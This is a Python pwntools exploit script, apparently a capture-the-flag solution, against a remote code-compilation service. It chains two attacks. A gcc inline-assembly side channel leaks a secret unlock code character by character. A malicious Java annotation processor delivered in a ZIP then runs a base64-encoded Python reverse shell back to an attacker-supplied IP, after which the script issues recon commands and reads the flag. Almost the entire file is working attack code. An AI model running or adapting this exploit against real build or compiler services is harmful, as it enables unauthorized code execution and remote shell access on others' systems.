#!/usr/bin/env python

from pwn import *

import json
import argparse
import tempfile
import pathlib
import os

# context.log_level = 'debug'


def generate_request(lang, user_input, unlock_code=None):
    '''Generate a JSON request from the parameters as bytes.
    '''
    struct = {
        'lang': lang,
        'input': base64.b64encode(user_input).decode(),
        'unlock': unlock_code,
    }
    return json.dumps(struct).encode()


def parse_response(line):
    return json.loads(line.strip())


# Original exploit technique from https://rpis.ec/blog/hxp-26c3-ctf-compilerbot/

LEAK_TEMPLATE = '''
int main() {
__asm__ (
    ".pushsection .eh_frame\\n"

    ".incbin \\"/unlock_code.txt\\", __OFFSET__, 1\\n"
    ".rept 3\\n"
    ".byte 0\\n"
    ".endr\\n"

    ".long 0x00000000\\n"
    ".byte 0x01\\n"
    ".asciz \\"zR\\"\\n"
    ".byte 0\\n"
    ".byte 0\\n"
    ".byte 0\\n"
    ".byte 0\\n"
    ".byte 0\\n"

    ".rept __GUESS__ - 13\\n"
    ".byte 0\\n"
    ".endr\\n"

    ".popsection\\n"
);
}
'''


def leak_unlock_code(p):
    '''Leak the unlock code with the bonus method detailed in
    https://rpis.ec/blog/hxp-26c3-ctf-compilerbot/ using gcc.
    '''
    # Leak the UUID in /unlock_code.txt
    uuid_dash_indices = (8, 13, 18, 23)
    unlock_code_progress = []
    hexchars = b'0123456789abcdef'
    for i in range(36):
        # Add dashes in the right places.
        if i in uuid_dash_indices:
            unlock_code_progress.append(b'-')
            continue

        # Search for the hexadecimal digit at the index.
        for guess in hexchars:
            attempt = LEAK_TEMPLATE.replace('__OFFSET__', str(i)).replace("__GUESS__", str(guess))
            request = generate_request('c', attempt.encode())
            p.sendline(request)
            line = p.recvline()
            response = parse_response(line)
            if 'success' in response['result']:
                unlock_code_progress.append(bytes([guess]))
                break

    return b''.join(unlock_code_progress).decode()


def java_annotation_rce(p, tmpdir, local_ip, local_port, unlock_code):
    '''Exploit the Java annotation RCE detailed in
    https://www.kalmarunionen.dk/writeups/2022/rwctf/secured-java/.
    '''
    zip_path = '{}/exp.zip'.format(tmpdir.name)
    user_input = open(zip_path, 'rb').read()
    request = generate_request('java', user_input, unlock_code)
    p.sendline(request)


PYTHON_REVSHELL = (
    "python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
    "s.connect((\"__IP__\",__PORT__));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno()"
    ",stdout=s.fileno(),stderr=s.fileno())'")

PROCESSOR_TEMPLATE = '''package dk.kalmar;
import java.util.*;
import javax.lang.model.*;
import javax.lang.model.element.*;
import javax.annotation.processing.*;

public class ExploitProcessor extends AbstractProcessor {
    public static void execCmd(String cmd) throws Exception {
        Runtime.getRuntime().exec(cmd);
    }

    static {
        try {
            execCmd("bash -c {echo,__REVSHELL__}|{base64,-d}|bash");
        } catch (Exception e) {
            System.out.println("Err: " + e.getMessage());
        }
   }

    // These methods needs to be defined, but doesn't matter
    // as the above static block will run before anything else
    @Override
    public synchronized void init(ProcessingEnvironment env) { }
    @Override
    public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment env) {
        return false;
    }
    @Override
    public Set<String> getSupportedAnnotationTypes() { return null; }
    @Override
    public SourceVersion getSupportedSourceVersion() { return null; }
}
'''

def generate_rce_zip(local_ip, local_port):
    '''Generates the RCE ZIP file.
    '''
    # Generate the reverse shell.
    revshell = PYTHON_REVSHELL.replace('__IP__', local_ip).replace('__PORT__', str(local_port))
    revshell = base64.b64encode(revshell.encode()).decode()
    processor_class = PROCESSOR_TEMPLATE.replace('__REVSHELL__', revshell)

    # Create a temporary directory to create the ZIP file structure.
    tmpdir = tempfile.TemporaryDirectory()
    tmpdirname = tmpdir.name
    log.info('Created temporary directory: {}'.format(tmpdirname))
    open("{}/ExploitProcessor.java".format(tmpdirname), 'w').write(processor_class)
    Path(tmpdirname + "/dep/META-INF/services/").mkdir(parents=True, exist_ok=True)
    Path(tmpdirname + "/dep/dk/kalmar/").mkdir(parents=True, exist_ok=True)
    open("{}/dep/META-INF/services/javax.annotation.processing.Processor".format(tmpdirname), 'wb'
         ).write(b'dk.kalmar.ExploitProcessor')
    os.system("bash -c 'cd {}; javac ExploitProcessor.java; "
              "mv ExploitProcessor.class dep/dk/kalmar/; "
              "rm ExploitProcessor.java' 2>/dev/null >/dev/null".format(tmpdirname))
    open("{}/Main.java".format(tmpdirname), 'wb').write(b'')
    os.system("bash -c 'cd {}/dep; jar cvf dep.jar ./; mv dep.jar ..' 2>/dev/null "
              ">/dev/null".format(tmpdirname))
    os.system("bash -c 'cd {}; rm -rf dep; zip -r exp.zip .' 2>/dev/null >/dev/null".format(
        tmpdirname))

    return tmpdir


def main():
    '''CI/Seedy exploit by amon
    '''
    # Parse the command line arguments.
    parser = argparse.ArgumentParser(
        description='Authentication Bypass and RCE exploit for soapbx'
    )
    parser.add_argument('target',
                        help='The target to exploit (e.g. 192.168.10.100)')
    parser.add_argument('reverseip',
                        help='The IP address to receive the reverse shell on')
    parser.add_argument('-p', '--port', type=int,
                        help='The target port to exploit (default 31337)', default=31337)
    args = parser.parse_args()

    # Launch the attack.
    target = args.target
    reverse_ip = args.reverseip
    port = args.port
    log.info('Executing CI/Seedy exploit against: {}:{}'.format(target, port))

    # Start the reverse shell listener.
    listener = listen()
    log.info('Reverse shell listener started on: {}:{}'.format(reverse_ip,
                                                               listener.lport))

    # Make the connection and drain the banner.
    p = remote(target, port)
    banner = p.recvline()
    log.info(banner.decode().strip())

    # Leak the unlock code with the C builder.
    log.progress('Leaking unlock code...')
    unlock_code = leak_unlock_code(p)
    log.success('Leaked unlock code: {}'.format(unlock_code))

    # Generate the Java RCE zip file.
    tmpdir = generate_rce_zip(reverse_ip, listener.lport)
    log.info('Java RCE ZIP file created.')

    # Trigger the reverse shell with the Java builder.
    java_annotation_rce(p, tmpdir, reverse_ip, listener.lport, unlock_code)
    log.success('Java annotation RCE triggered. Please standby for shell.')

    # Catch the reverse shell and automate obtaining the flag.
    listener.wait_for_connection()
    log.success("Enjoy your shell.")
    listener.sendline(b"uname -a")
    listener.sendline(b"id")
    listener.sendline(b"ifconfig")
    listener.sendline(b"/readflag")
    listener.interactive()

    # Close the connection.
    p.close()


if __name__ == '__main__':
    main()
